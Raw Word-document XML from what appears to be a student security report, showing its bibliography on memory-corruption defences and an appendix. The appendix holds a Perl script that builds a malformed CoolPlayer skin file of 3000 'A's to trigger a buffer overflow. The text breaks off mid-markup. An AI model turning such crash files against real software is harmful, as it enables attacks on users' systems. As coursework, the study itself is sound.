              </w:r>
              <w:r>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
                <w:t xml:space="preserve"> Levallois-Perret: Sysdream.</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="3280AA1C" w14:textId="77777777" w:rsidR="00DC56CC" w:rsidRDefault="00DC56CC" w:rsidP="00DC56CC">
              <w:pPr>
                <w:pStyle w:val="Bibliography"/>
                <w:ind w:left="720" w:hanging="720"/>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
              </w:pPr>
              <w:r>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
                <w:t xml:space="preserve">Lemmens, M. (2021, February 4). </w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:i/>
                  <w:iCs/>
                  <w:noProof/>
                </w:rPr>
                <w:t>Stack Canaries – Gingerly Sidestepping the Cage</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
                <w:t>. Retrieved from SANS: https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="0D0AB883" w14:textId="77777777" w:rsidR="00DC56CC" w:rsidRDefault="00DC56CC" w:rsidP="00DC56CC">
              <w:pPr>
                <w:pStyle w:val="Bibliography"/>
                <w:ind w:left="720" w:hanging="720"/>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
              </w:pPr>
              <w:r>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
                <w:t xml:space="preserve">meir555. (2022, 05 12). </w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:i/>
                  <w:iCs/>
                  <w:noProof/>
                </w:rPr>
                <w:t>Format String Attack</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
                <w:t>. Retrieved from OWASP: https://owasp.org/www-community/attacks/Format_string_attack</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="6F551FE0" w14:textId="77777777" w:rsidR="00DC56CC" w:rsidRDefault="00DC56CC" w:rsidP="00DC56CC">
              <w:pPr>
                <w:pStyle w:val="Bibliography"/>
                <w:ind w:left="720" w:hanging="720"/>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
              </w:pPr>
              <w:r>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
                <w:t xml:space="preserve">mmiller. (2006). </w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:i/>
                  <w:iCs/>
                  <w:noProof/>
                </w:rPr>
                <w:t>Preventing the Exploitation of SEH Overwrites.</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
                <w:t xml:space="preserve"> sine loco: ihteam.</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="2FB4CD9C" w14:textId="77777777" w:rsidR="00DC56CC" w:rsidRDefault="00DC56CC" w:rsidP="00DC56CC">
              <w:pPr>
                <w:pStyle w:val="Bibliography"/>
                <w:ind w:left="720" w:hanging="720"/>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
              </w:pPr>
              <w:r>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
                <w:t xml:space="preserve">National Health Executive. (2018, 10 12). </w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:i/>
                  <w:iCs/>
                  <w:noProof/>
                </w:rPr>
                <w:t>WannaCry cyber-attack cost the NHS £92m after 19,000 appointments were cancelled</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
                <w:t>. Retrieved from National Health Executive: https://www.nationalhealthexecutive.com/articles/wannacry-cyber-attack-cost-nhs-ps92m-after-19000-appointments-were-cancelled</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="4640AF9D" w14:textId="77777777" w:rsidR="00DC56CC" w:rsidRDefault="00DC56CC" w:rsidP="00DC56CC">
              <w:pPr>
                <w:pStyle w:val="Bibliography"/>
                <w:ind w:left="720" w:hanging="720"/>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
              </w:pPr>
              <w:r>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
                <w:t xml:space="preserve">Offensive Security. (2022, 05 09). </w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:i/>
                  <w:iCs/>
                  <w:noProof/>
                </w:rPr>
                <w:t>Why OffSec?</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
                <w:t xml:space="preserve"> Retrieved from offensive-security: https://www.offensive-security.com/why-offsec/</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="3A9E00FD" w14:textId="77777777" w:rsidR="00DC56CC" w:rsidRDefault="00DC56CC" w:rsidP="00DC56CC">
              <w:pPr>
                <w:pStyle w:val="Bibliography"/>
                <w:ind w:left="720" w:hanging="720"/>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
              </w:pPr>
              <w:r>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
                <w:t xml:space="preserve">OWASP. (2021, 04 29). </w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:i/>
                  <w:iCs/>
                  <w:noProof/>
                </w:rPr>
                <w:t>OWASP Developer Guide</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
                <w:t>. Retrieved from Github: https://github.com/OWASP/DevGuide</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="5A98B36A" w14:textId="77777777" w:rsidR="00DC56CC" w:rsidRDefault="00DC56CC" w:rsidP="00DC56CC">
              <w:pPr>
                <w:pStyle w:val="Bibliography"/>
                <w:ind w:left="720" w:hanging="720"/>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
              </w:pPr>
              <w:r>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
                <w:lastRenderedPageBreak/>
                <w:t xml:space="preserve">Rubens, P. (2018, 7 2018). </w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:i/>
                  <w:iCs/>
                  <w:noProof/>
                </w:rPr>
                <w:t>6 Best Practices to Prevent DDoS Attacks</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
                <w:t>. Retrieved from eSecurity Planet: https://www.esecurityplanet.com/networks/how-to-prevent-ddos-attacks-tips-to-keep-your-website-safe/</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="2F27CA9E" w14:textId="77777777" w:rsidR="00DC56CC" w:rsidRDefault="00DC56CC" w:rsidP="00DC56CC">
              <w:pPr>
                <w:pStyle w:val="Bibliography"/>
                <w:ind w:left="720" w:hanging="720"/>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
              </w:pPr>
              <w:r>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
                <w:t xml:space="preserve">Saylor Academy. (2022, 05 13). </w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:i/>
                  <w:iCs/>
                  <w:noProof/>
                </w:rPr>
                <w:t>CS406: Information Security - IDS</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
                <w:t>. Retrieved from Saylor Academy: https://learn.saylor.org/mod/book/view.php?id=29755&amp;chapterid=5428</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="2494D276" w14:textId="77777777" w:rsidR="00DC56CC" w:rsidRDefault="00DC56CC" w:rsidP="00DC56CC">
              <w:pPr>
                <w:pStyle w:val="Bibliography"/>
                <w:ind w:left="720" w:hanging="720"/>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
              </w:pPr>
              <w:r>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
                <w:t xml:space="preserve">Wyman, M. (2002). </w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:i/>
                  <w:iCs/>
                  <w:noProof/>
                </w:rPr>
                <w:t>Intrusion Detection, Evasion, and Trace Analysis.</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
                <w:t xml:space="preserve"> San Antonio: GCIA. Retrieved from https://www.giac.org/paper/gcia/615/intrusion-detection-evasion-trace-analysis/104437</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="6D68E1BB" w14:textId="0ED0792E" w:rsidR="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00DC56CC">
              <w:r>
                <w:rPr>
                  <w:b/>
                  <w:bCs/>
                  <w:noProof/>
                </w:rPr>
                <w:fldChar w:fldCharType="end"/>
              </w:r>
            </w:p>
          </w:sdtContent>
        </w:sdt>
      </w:sdtContent>
    </w:sdt>
    <w:p w14:paraId="568E4360" w14:textId="491E8A8D" w:rsidR="00801886" w:rsidRPr="006E34CB" w:rsidRDefault="00801886" w:rsidP="008332D2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2ABB8DDF" w14:textId="77777777" w:rsidR="006C6590" w:rsidRDefault="006C6590" w:rsidP="008332D2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="783E6F3D" w14:textId="77777777" w:rsidR="00341658" w:rsidRDefault="00341658" w:rsidP="008332D2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
          <w:b/>
          <w:bCs/>
          <w:smallCaps/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="48"/>
          <w:szCs w:val="36"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E3E5F17" w14:textId="3682AC2E" w:rsidR="00801886" w:rsidRPr="009A241B" w:rsidRDefault="00341658" w:rsidP="008332D2">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="51" w:name="_Toc102919490"/>
      <w:bookmarkStart w:id="52" w:name="_Toc103326482"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Appendices</w:t>
      </w:r>
      <w:bookmarkEnd w:id="51"/>
      <w:bookmarkEnd w:id="52"/>
    </w:p>
    <w:p w14:paraId="3119DCD0" w14:textId="73331565" w:rsidR="006274C0" w:rsidRDefault="00341658" w:rsidP="006274C0">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="53" w:name="_Toc102919491"/>
      <w:bookmarkStart w:id="54" w:name="_Toc103326483"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Appendix </w:t>
      </w:r>
      <w:r w:rsidR="009525A9">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:bookmarkEnd w:id="53"/>
      <w:r w:rsidR="005E1F6C">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> - Screenshots</w:t>
      </w:r>
      <w:bookmarkEnd w:id="54"/>
    </w:p>
    <w:p w14:paraId="76FDC86C" w14:textId="08C87723" w:rsidR="006274C0" w:rsidRPr="006274C0" w:rsidRDefault="006274C0" w:rsidP="005E1F6C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="55" w:name="_Toc103326484"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>A1 - Full output from the initial overflow test</w:t>
      </w:r>
      <w:bookmarkEnd w:id="55"/>
    </w:p>
    <w:p w14:paraId="580B75C7" w14:textId="11C27EC3" w:rsidR="00305636" w:rsidRDefault="006274C0" w:rsidP="006274C0">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2425C1E6" wp14:editId="2AD63268">
            <wp:extent cx="5943600" cy="4597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597400"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A3AEDD3" w14:textId="3317781D" w:rsidR="00305636" w:rsidRDefault="00305636" w:rsidP="005E1F6C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="56" w:name="_Toc103326485"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>A2 - The contents of crash.pl after running pattern_create.exe</w:t>
      </w:r>
      <w:bookmarkEnd w:id="56"/>
    </w:p>
    <w:p w14:paraId="0D12996E" w14:textId="1D94C6B0" w:rsidR="00305636" w:rsidRPr="006274C0" w:rsidRDefault="00305636" w:rsidP="006274C0">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6F970A7A" wp14:editId="2A39F5A8">
            <wp:extent cx="5943600" cy="8051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805180"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="750D4593" w14:textId="52EA0AD7" w:rsidR="005E1F6C" w:rsidRDefault="009525A9" w:rsidP="005E1F6C">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="57" w:name="_Toc102919492"/>
      <w:bookmarkStart w:id="58" w:name="_Toc103326486"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Appendi</w:t>
      </w:r>
      <w:r w:rsidR="00C3473A">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> B</w:t>
      </w:r>
      <w:bookmarkEnd w:id="57"/>
      <w:r w:rsidR="005E1F6C">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> - Code</w:t>
      </w:r>
      <w:bookmarkEnd w:id="58"/>
    </w:p>
    <w:p w14:paraId="26474580" w14:textId="0B9E65CE" w:rsidR="005E1F6C" w:rsidRDefault="00CF75AD" w:rsidP="005E1F6C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="59" w:name="_Toc103326487"/>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251677696" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="33DC428B" wp14:editId="30070FB5">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>-361950</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>352425</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="6210300" cy="809625"/>
                <wp:effectExtent l="0" t="0" r="19050" b="2857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300" cy="809625"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="5C88855F" w14:textId="0217E178" w:rsidR="005E1F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="00090631" w:rsidP="005E1F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t xml:space="preserve">$file1 = </w:t>
                            </w:r>
                            <w:r w:rsidR="00770BC8" w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>skincrash.ini</w:t>
                            </w:r>
                            <w:r w:rsidR="00770BC8" w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                            <w:r w:rsidR="005E1F6C" w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidR="005E1F6C" w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidR="005E1F6C" w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidR="005E1F6C" w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidR="005E1F6C" w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:color w:val="4E8542" w:themeColor="accent4"/>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>#the name of the file that will be created, must end in .ini</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="7C716686" w14:textId="3504C70A" w:rsidR="005E1F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="005E1F6C" w:rsidP="005E1F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:ind w:left="4245" w:hanging="4245"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t xml:space="preserve">$buffer = </w:t>
                            </w:r>
                            <w:r w:rsidR="00770BC8" w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t xml:space="preserve">" </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>[CoolPlayer Skin]\</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>nPlaylistSkin</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>=</w:t>
                            </w:r>
                            <w:r w:rsidR="00770BC8" w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                            <w:r w:rsidR="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:color w:val="4E8542" w:themeColor="accent4"/>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>#include this as a header before overflowing for it to be recognized as a skin</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="25771ACB" w14:textId="1354A812" w:rsidR="005E1F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="005E1F6C" w:rsidP="005E1F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t xml:space="preserve">$buffer .= </w:t>
                            </w:r>
                            <w:r w:rsidR="00770BC8" w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>A</w:t>
                            </w:r>
                            <w:r w:rsidR="00770BC8" w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>x3000;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidR="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:color w:val="4E8542" w:themeColor="accent4"/>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>#append (.=) 3000 A’s which should crash the program</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="654B97D0" w14:textId="77777777" w:rsidR="005E1F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="005E1F6C" w:rsidP="005E1F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>open ($FILE, “&gt;$file1”);</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:color w:val="4E8542" w:themeColor="accent4"/>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>#create an empty file with the name defined in $file1</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="200BFE00" w14:textId="31C0816C" w:rsidR="005E1F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="005E1F6C" w:rsidP="005E1F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>print $FILE $buffer;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidR="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:color w:val="4E8542" w:themeColor="accent4"/>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>#add the contents of $buffer and its appended data</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="071C0E03" w14:textId="77777777" w:rsidR="005E1F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="005E1F6C" w:rsidP="005E1F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>close($FILE);</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
